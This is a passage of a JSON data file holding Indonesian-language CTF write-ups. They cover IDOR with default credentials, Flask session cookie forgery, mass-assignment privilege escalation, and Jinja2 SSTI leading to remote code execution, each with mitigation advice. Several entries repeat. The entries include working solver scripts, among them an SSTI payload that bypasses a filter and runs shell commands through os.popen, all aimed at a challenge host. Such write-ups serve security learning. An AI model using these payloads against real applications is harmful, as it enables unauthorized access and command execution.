        "content": "Gunakan curl untuk cek perilaku aplikasi:\n\nHasil: redirect ke `/login`.",
        "code": "curl -i http://23.179.17.92:5001/"
      },
      {
        "title": "2. Login dengan kredensial lemah",
        "content": "Coba beberapa default credential, ternyata `admin:admin` valid (HTTP 302 ke `/`).\n\nContoh:",
        "code": "curl -i -X POST http://23.179.17.92:5001/login -d 'username=admin&password=admin'"
      },
      {
        "title": "3. Identifikasi IDOR di report",
        "content": "Setelah login, dashboard menampilkan daftar report dengan link format:\n- `/report?id=514`\n- `/report?id=543`\n- dst\n\nEndpoint ini hanya bergantung pada `id` dan tidak melakukan validasi ownership yang benar.\nAkibatnya, user login dapat membuka report user lain dengan mengganti nilai `id`."
      },
      {
        "title": "Dampak Kerentanan",
        "content": "- Kebocoran data antar akun.\n- Data sensitif (termasuk flag/internal report) dapat diakses user yang tidak berhak.\n- Menurunkan confidentiality secara penuh."
      },
      {
        "title": "Rekomendasi Perbaikan",
        "content": "1. Hapus default credential, paksa password kuat.\n2. Terapkan authorization check di `GET /report?id=...`:\n   - pastikan `report.owner_id == session.user_id` (atau role admin yang benar-benar tervalidasi).\n3. Tambahkan monitoring percobaan enumerasi ID dan rate limit.\n4. Gunakan UUID/ID non-sekuensial untuk mempersulit enumerasi."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport sys\r\nimport requests\r\n\r\nBASE_URL = \"http://23.179.17.92:5001\"\r\nUSERNAME = \"admin\"\r\nPASSWORD = \"admin\"\r\nFLAG_RE = re.compile(r\"CIT\\{[^}]+\\}\")\r\n\r\n\r\ndef get_flag_from_id(session: requests.Session, report_id: int) -> str | None:\r\n    try:\r\n        r = session.get(f\"{BASE_URL}/report\", params={\"id\": report_id}, timeout=4)\r\n    except requests.RequestException:\r\n        return None\r\n\r\n    if r.status_code != 200:\r\n        return None\r\n\r\n    m = FLAG_RE.search(r.text)\r\n    return m.group(0) if m else None\r\n\r\n\r\ndef main() -> int:\r\n    s = requests.Session()\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": USERNAME, \"password\": PASSWORD},\r\n        allow_redirects=False,\r\n        timeout=5,\r\n    )\r\n\r\n    if login.status_code != 302:\r\n        print(f\"[-] Login gagal. Status: {login.status_code}\")\r\n        return 1\r\n\r\n    # Berdasarkan hasil exploit, flag ada di report id 347.\r\n    flag = get_flag_from_id(s, 347)\r\n    if flag:\r\n        print(\"[+] Flag ditemukan di report id=347\")\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n        return 0\r\n\r\n    # Fallback: enumerasi cepat jika ID berubah.\r\n    for report_id in range(1, 2001):\r\n        flag = get_flag_from_id(s, report_id)\r\n        if flag:\r\n            print(f\"[+] Flag ditemukan di report id={report_id}\")\r\n            print(f\"<FLAG>{flag}</FLAG>\")\r\n            return 0\r\n\r\n    print(\"[-] Flag tidak ditemukan\")\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    sys.exit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{Acc355_C0ntr0l_M@tt3rs!}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-signupandenjoy",
    "title": "- Sign Up and Enjoy",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "CitCTF",
    "tags": [],
    "description": "Writeup for challenge - Sign Up and Enjoy",
    "problemDescription": "Aplikasi memakai Flask session cookie (signed, bukan encrypted) untuk menyimpan role user:\n- `role`\n- `uid`\n- `username`\n\nEndpoint `/admin` hanya cek nilai `role` dari session cookie. Karena `SECRET_KEY` aplikasi lemah (`Password1!`), cookie bisa di-`unsign`, secret bisa di-crack dengan wordlist umum, lalu cookie admin bisa dipalsukan (session forgery).",
    "tools": [],
    "analysis": "Endpoint yang terlihat:\n- `/`\n- `/login`\n- `/register`\n- `/workspace`\n- `/tools/link-preview`\n- `/admin`\n\nSaat akses `/admin` sebagai user biasa, server redirect ke `/workspace`.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Kategori: Web Misc\n- Judul: Sign Up and Enjoy\n- Target: `http://23.179.17.92:5557`"
      },
      {
        "title": "2. Buat akun / login akun valid",
        "content": "Setelah login, server set cookie session Flask.\nContoh isi cookie setelah decode:\n\n\n\nArtinya role authorization dikontrol dari data session cookie.",
        "code": "{'role': 'standard', 'uid': 'u_e3178437', 'username': 'u1776500504'}"
      },
      {
        "title": "4. Forge cookie admin",
        "content": "Dengan secret di atas, sign payload baru yang berisi role admin:\n\n\n\nCommand:\n\n\n\nLalu akses `/admin` dengan cookie forged tersebut.",
        "code": "{'role':'admin','uid':'u_e3178437','username':'u1776500504'}"
      },
      {
        "title": "Dampak",
        "content": "- Privilege escalation dari user biasa ke admin\n- Bypass penuh kontrol akses endpoint sensitif"
      },
      {
        "title": "Rekomendasi Perbaikan",
        "content": "- Gunakan `SECRET_KEY` kuat dan random (panjang, high entropy)\n- Rotasi secret lama dan invalidasi session aktif\n- Jangan simpan atribut authorization kritikal (`role`) langsung di client session cookie\n- Validasi role dari sisi server/database\n- Pertimbangkan server-side session storage"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{W3ak_S3cr3t5_C@n_B3_Un5ign3d}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-amassiveproblem",
    "title": "- A Massive Problem (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Citctf",
    "tags": [],
    "description": "Challenge ini terlihat seperti aplikasi internal biasa: ada register, login, dashboard, profile, dan panel admin.\nDeskripsi challenge bilang: *\"Improper Authorization has been fixed!\"*.\nDari judulnya (*A Massive Problem*), indikasi paling kuat adalah **mass assignment** masih ada.",
    "problemDescription": "Endpoint `POST /api/profile` menerima JSON profile update dari user biasa.\nAplikasi seharusnya hanya mengizinkan field aman seperti:\n- `full_name`\n- `title`\n- `team`\n- opsional `password`\n\nTapi backend ternyata masih menerima field sensitif `role`.\nAkibatnya user biasa bisa kirim payload `{\"role\":\"admin\"}` dan naik privilege ke admin.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Target",
        "content": "- URL: `http://23.179.17.92:5556`\n- Teknologi (dari header): `Werkzeug/3.1.8`, Python 3.12"
      },
      {
        "title": "1. Register akun biasa",
        "content": "Kirim request ke:\n- `POST /api/register`\n\nContoh payload:",
        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"username\": \"natauser\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"password\": \"Abcd1234!\"\n}"
      },
      {
        "title": "2. Login akun tersebut",
        "content": "Kirim request ke:\n- `POST /api/login`\n\nContoh payload:",
        "code": "{\n  \"username\": \"natauser\",\n  \"password\": \"Abcd1234!\"\n}"
      },
      {
        "title": "3. Abuse mass assignment di profile update",
        "content": "Kirim request ke:\n- `POST /api/profile`\n\nPayload exploit:\n\n\n\nServer merespon sukses (`200`) dan minta login ulang.",
        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"role\": \"admin\"\n}"
      },
      {
        "title": "4. Login ulang, akses `/admin`",
        "content": "Setelah login ulang, dashboard menampilkan link Admin.\nAkses `/admin` dan flag muncul langsung di halaman."
      },
      {
        "title": "Solver Otomatis",
        "content": "Saya simpan solver di file:\n- `solve.py`\n\nJalankan dengan venv kamu:\n\n\n\nAtau pakai URL lain:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Kenapa ini terjadi?",
        "content": "Masalah inti: backend melakukan update model user dari body JSON tanpa allowlist field ketat.\nJadi field yang seharusnya internal (`role`) ikut ter-assign."
      },
      {
        "title": "Mitigasi yang benar",
        "content": "- Terapkan allowlist strict untuk field yang boleh diupdate user.\n- Jangan pernah ambil `role` dari input user biasa.\n- Pisahkan endpoint admin update privilege dari endpoint profile user.\n- Tambah test keamanan: pastikan user standar tidak bisa mengubah role sendiri."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport json\r\nimport random\r\nimport re\r\nimport string\r\nimport sys\r\nimport urllib.request\r\nimport urllib.error\r\nimport http.cookiejar\r\n\r\n\r\ndef rand_suffix(n=6):\r\n    alphabet = string.ascii_lowercase + string.digits\r\n    return ''.join(random.choice(alphabet) for _ in range(n))\r\n\r\n\r\ndef make_opener():\r\n    cj = http.cookiejar.CookieJar()\r\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\r\n\r\n\r\ndef post_json(opener, url, payload):\r\n    data = json.dumps(payload).encode()\r\n    req = urllib.request.Request(\r\n        url,\r\n        data=data,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef get(opener, url):\r\n    req = urllib.request.Request(url, method=\"GET\")\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser(description=\"Solve A Massive Problem (mass assignment privesc)\")\r\n    ap.add_argument(\"--url\", default=\"http://23.179.17.92:5556\", help=\"Base URL target\")\r\n    ap.add_argument(\"--password\", default=\"Abcd1234!\", help=\"Password untuk akun baru\")\r\n    args = ap.parse_args()\r\n\r\n    base = args.url.rstrip(\"/\")\r\n    opener = make_opener()\r\n\r\n    username = f\"nata_{rand_suffix()}\"\r\n    register_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"username\": username,\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"password\": args.password,\r\n    }\r\n\r\n    # 1) Register user biasa\r\n    code, body = post_json(opener, f\"{base}/api/register\", register_payload)\r\n    if code != 200:\r\n        print(f\"[!] Register gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 2) Login user\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login awal gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 3) Mass assignment di /api/profile\r\n    #    role diubah jadi admin walau harusnya tidak boleh dari user biasa\r\n    profile_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"role\": \"admin\",\r\n    }\r\n    code, body = post_json(opener, f\"{base}/api/profile\", profile_payload)\r\n    if code != 200:\r\n        print(f\"[!] Update profile gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 4) Login ulang (sesuai behavior aplikasi)\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login ulang gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 5) Akses admin dan ambil flag\r\n    code, html = get(opener, f\"{base}/admin\")\r\n    if code != 200:\r\n        print(f\"[!] /admin gagal diakses: HTTP {code}\")\r\n        sys.exit(1)\r\n\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", html)\r\n    if not m:\r\n        print(\"[!] Flag tidak ditemukan di /admin\")\r\n        sys.exit(1)\r\n\r\n    flag = m.group(0)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{M@ss_@ssignm3nt_Pr1v3sc}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-temprorarydestruction",
    "title": "Temporary Destruction",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Citctf",
    "tags": [],
    "description": "Challenge category: Web Misc  \nTarget: `http://23.179.17.92:5558`",
    "problemDescription": "Aplikasi ini vulnerable ke **Server-Side Template Injection (SSTI)** di Jinja2.  \nInput user dirender sebagai template, sehingga ekspresi seperti `{{7*7}}` dieksekusi server.\n\nDari SSTI, saya escalate ke RCE dan baca file flag di server.\n\nFlag: `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah Penyelesaian",
        "content": "1. **Enumerasi awal**\n   - `GET /` menampilkan form dengan textarea `user_input`.\n   - Setelah submit, hasil ditampilkan di `<pre>...</pre>`.\n\n2. **Cek SSTI**\n   - Kirim payload:\n     \n   - Output menjadi `49`, artinya template dievaluasi di server (SSTI confirmed).\n\n3. **Uji jalur object traversal**\n   - Payload `{{url_for.__globals__}}` menghasilkan `rejected.` (ada blacklist sederhana).\n   - Bypass blacklist dilakukan dengan hex escape untuk karakter `_`:\n     \n   - Ini berhasil membuka akses ke global namespace Flask module.\n\n4. **RCE**\n   - Panggil `os.popen` dari globals:\n     \n   - Output valid (`uid=1000(ctf) ...`) => command execution berhasil.\n\n5. **Ambil flag**\n   - Enumerasi file cepat menemukan `/tmp/flag.txt`.\n   - Baca isi:\n     \n   - Flag didapat.",
        "code": "{{7*7}}"
      },
      {
        "title": "Solver",
        "content": "File solver disimpan di: `solver.py`\n\nJalankan:\n\n\n\nAtau custom target:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport re\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(resp_text: str) -> str:\r\n    m = re.search(r\"<pre>(.*?)</pre>\", resp_text, re.S)\r\n    if not m:\r\n        return \"\"\r\n    return html.unescape(m.group(1))\r\n\r\n\r\ndef run_cmd(base_url: str, cmd: str, timeout: int = 15) -> str:\r\n    safe_cmd = cmd.replace(\"'\", \"'\\\"'\\\"'\")\r\n    payload = (\r\n        \"{{(url_for|attr('\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f'))['os'].\"\r\n        \"popen('\" + safe_cmd + \"').read()}}\"\r\n    )\r\n    r = requests.post(base_url, data={\"user_input\": payload}, timeout=timeout)\r\n    r.raise_for_status()\r\n    return extract_pre(r.text)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Temporary Destruction solver (SSTI)\")\r\n    parser.add_argument(\r\n        \"-u\",\r\n        \"--url\",\r\n        default=\"http://23.179.17.92:5558/\",\r\n        help=\"Target URL (default: http://23.179.17.92:5558/)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    url = args.url.rstrip(\"/\") + \"/\"\r\n\r\n    sanity = run_cmd(url, \"id\")\r\n    if \"uid=\" not in sanity:\r\n        raise RuntimeError(\"RCE check failed\")\r\n\r\n    flag = run_cmd(url, \"cat /tmp/flag.txt\")\r\n    print(flag.strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{55T1_R3m0t3_C0d3_3x3cut1on}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-amassiveproblem-a-massive-problem",
    "title": "- A Massive Problem (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Citctf",
    "tags": [],
    "description": "Challenge ini terlihat seperti aplikasi internal biasa: ada register, login, dashboard, profile, dan panel admin.\nDeskripsi challenge bilang: *\"Improper Authorization has been fixed!\"*.\nDari judulnya (*A Massive Problem*), indikasi paling kuat adalah **mass assignment** masih ada.",
    "problemDescription": "Endpoint `POST /api/profile` menerima JSON profile update dari user biasa.\nAplikasi seharusnya hanya mengizinkan field aman seperti:\n- `full_name`\n- `title`\n- `team`\n- opsional `password`\n\nTapi backend ternyata masih menerima field sensitif `role`.\nAkibatnya user biasa bisa kirim payload `{\"role\":\"admin\"}` dan naik privilege ke admin.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Target",
        "content": "- URL: `http://23.179.17.92:5556`\n- Teknologi (dari header): `Werkzeug/3.1.8`, Python 3.12"
      },
      {
        "title": "1. Register akun biasa",
        "content": "Kirim request ke:\n- `POST /api/register`\n\nContoh payload:",
        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"username\": \"natauser\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"password\": \"Abcd1234!\"\n}"
      },
      {
        "title": "2. Login akun tersebut",
        "content": "Kirim request ke:\n- `POST /api/login`\n\nContoh payload:",
        "code": "{\n  \"username\": \"natauser\",\n  \"password\": \"Abcd1234!\"\n}"
      },
      {
        "title": "3. Abuse mass assignment di profile update",
        "content": "Kirim request ke:\n- `POST /api/profile`\n\nPayload exploit:\n\n\n\nServer merespon sukses (`200`) dan minta login ulang.",
        "code": "{\n  \"full_name\": \"Nata Test\",\n  \"title\": \"Dev\",\n  \"team\": \"Ops\",\n  \"role\": \"admin\"\n}"
      },
      {
        "title": "4. Login ulang, akses `/admin`",
        "content": "Setelah login ulang, dashboard menampilkan link Admin.\nAkses `/admin` dan flag muncul langsung di halaman."
      },
      {
        "title": "Solver Otomatis",
        "content": "Saya simpan solver di file:\n- `solve.py`\n\nJalankan dengan venv kamu:\n\n\n\nAtau pakai URL lain:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Kenapa ini terjadi?",
        "content": "Masalah inti: backend melakukan update model user dari body JSON tanpa allowlist field ketat.\nJadi field yang seharusnya internal (`role`) ikut ter-assign."
      },
      {
        "title": "Mitigasi yang benar",
        "content": "- Terapkan allowlist strict untuk field yang boleh diupdate user.\n- Jangan pernah ambil `role` dari input user biasa.\n- Pisahkan endpoint admin update privilege dari endpoint profile user.\n- Tambah test keamanan: pastikan user standar tidak bisa mengubah role sendiri."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport json\r\nimport random\r\nimport re\r\nimport string\r\nimport sys\r\nimport urllib.request\r\nimport urllib.error\r\nimport http.cookiejar\r\n\r\n\r\ndef rand_suffix(n=6):\r\n    alphabet = string.ascii_lowercase + string.digits\r\n    return ''.join(random.choice(alphabet) for _ in range(n))\r\n\r\n\r\ndef make_opener():\r\n    cj = http.cookiejar.CookieJar()\r\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\r\n\r\n\r\ndef post_json(opener, url, payload):\r\n    data = json.dumps(payload).encode()\r\n    req = urllib.request.Request(\r\n        url,\r\n        data=data,\r\n        headers={\"Content-Type\": \"application/json\"},\r\n        method=\"POST\",\r\n    )\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef get(opener, url):\r\n    req = urllib.request.Request(url, method=\"GET\")\r\n    with opener.open(req, timeout=10) as r:\r\n        body = r.read().decode(\"utf-8\", errors=\"ignore\")\r\n        code = r.getcode()\r\n    return code, body\r\n\r\n\r\ndef main():\r\n    ap = argparse.ArgumentParser(description=\"Solve A Massive Problem (mass assignment privesc)\")\r\n    ap.add_argument(\"--url\", default=\"http://23.179.17.92:5556\", help=\"Base URL target\")\r\n    ap.add_argument(\"--password\", default=\"Abcd1234!\", help=\"Password untuk akun baru\")\r\n    args = ap.parse_args()\r\n\r\n    base = args.url.rstrip(\"/\")\r\n    opener = make_opener()\r\n\r\n    username = f\"nata_{rand_suffix()}\"\r\n    register_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"username\": username,\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"password\": args.password,\r\n    }\r\n\r\n    # 1) Register user biasa\r\n    code, body = post_json(opener, f\"{base}/api/register\", register_payload)\r\n    if code != 200:\r\n        print(f\"[!] Register gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 2) Login user\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login awal gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 3) Mass assignment di /api/profile\r\n    #    role diubah jadi admin walau harusnya tidak boleh dari user biasa\r\n    profile_payload = {\r\n        \"full_name\": \"Nata Solver\",\r\n        \"title\": \"Dev\",\r\n        \"team\": \"Ops\",\r\n        \"role\": \"admin\",\r\n    }\r\n    code, body = post_json(opener, f\"{base}/api/profile\", profile_payload)\r\n    if code != 200:\r\n        print(f\"[!] Update profile gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 4) Login ulang (sesuai behavior aplikasi)\r\n    code, body = post_json(opener, f\"{base}/api/login\", {\"username\": username, \"password\": args.password})\r\n    if code != 200:\r\n        print(f\"[!] Login ulang gagal: HTTP {code} {body}\")\r\n        sys.exit(1)\r\n\r\n    # 5) Akses admin dan ambil flag\r\n    code, html = get(opener, f\"{base}/admin\")\r\n    if code != 200:\r\n        print(f\"[!] /admin gagal diakses: HTTP {code}\")\r\n        sys.exit(1)\r\n\r\n    m = re.search(r\"CIT\\{[^}]+\\}\", html)\r\n    if not m:\r\n        print(\"[!] Flag tidak ditemukan di /admin\")\r\n        sys.exit(1)\r\n\r\n    flag = m.group(0)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{M@ss_@ssignm3nt_Pr1v3sc}",
    "lessonsLearned": ""
  },
  {
    "id": "citctf-web-temprorarydestruction-temporary-destruction",
    "title": "Temporary Destruction",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "Citctf",
    "tags": [],
    "description": "Challenge category: Web Misc  \nTarget: `http://23.179.17.92:5558`",
    "problemDescription": "Aplikasi ini vulnerable ke **Server-Side Template Injection (SSTI)** di Jinja2.  \nInput user dirender sebagai template, sehingga ekspresi seperti `{{7*7}}` dieksekusi server.\n\nDari SSTI, saya escalate ke RCE dan baca file flag di server.\n\nFlag: `CIT{55T1_R3m0t3_C0d3_3x3cut1on}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah Penyelesaian",
        "content": "1. **Enumerasi awal**\n   - `GET /` menampilkan form dengan textarea `user_input`.\n   - Setelah submit, hasil ditampilkan di `<pre>...</pre>`.\n\n2. **Cek SSTI**\n   - Kirim payload:\n     \n   - Output menjadi `49`, artinya template dievaluasi di server (SSTI confirmed).\n\n3. **Uji jalur object traversal**\n   - Payload `{{url_for.__globals__}}` menghasilkan `rejected.` (ada blacklist sederhana).\n   - Bypass blacklist dilakukan dengan hex escape untuk karakter `_`:\n     \n   - Ini berhasil membuka akses ke global namespace Flask module.\n\n4. **RCE**\n   - Panggil `os.popen` dari globals:\n     \n   - Output valid (`uid=1000(ctf) ...`) => command execution berhasil.\n\n5. **Ambil flag**\n   - Enumerasi file cepat menemukan `/tmp/flag.txt`.\n   - Baca isi:\n     \n   - Flag didapat.",
        "code": "{{7*7}}"
      },
      {
        "title": "Solver",
        "content": "File solver disimpan di: `solver.py`\n\nJalankan:\n\n\n\nAtau custom target:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport html\r\nimport re\r\n\r\nimport requests\r\n\r\n\r\ndef extract_pre(resp_text: str) -> str:\r\n    m = re.search(r\"<pre>(.*?)</pre>\", resp_text, re.S)\r\n    if not m:\r\n        return \"\"\r\n    return html.unescape(m.group(1))\r\n\r\n\r\ndef run_cmd(base_url: str, cmd: str, timeout: int = 15) -> str:\r\n    safe_cmd = cmd.replace(\"'\", \"'\\\"'\\\"'\")\r\n    payload = (\r\n        \"{{(url_for|attr('\\\\x5f\\\\x5fglobals\\\\x5f\\\\x5f'))['os'].\"\r\n        \"popen('\" + safe_cmd + \"').read()}}\"\r\n    )\r\n    r = requests.post(base_url, data={\"user_input\": payload}, timeout=timeout)\r\n    r.raise_for_status()\r\n    return extract_pre(r.text)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(description=\"Temporary Destruction solver (SSTI)\")\r\n    parser.add_argument(\r\n        \"-u\",\r\n        \"--url\",\r\n        default=\"http://23.179.17.92:5558/\",\r\n        help=\"Target URL (default: http://23.179.17.92:5558/)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    url = args.url.rstrip(\"/\") + \"/\"\r\n\r\n    sanity = run_cmd(url, \"id\")\r\n    if \"uid=\" not in sanity:\r\n        raise RuntimeError(\"RCE check failed\")\r\n\r\n    flag = run_cmd(url, \"cat /tmp/flag.txt\")\r\n    print(flag.strip())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CIT{55T1_R3m0t3_C0d3_3x3cut1on}",
    "lessonsLearned": ""
  }
];
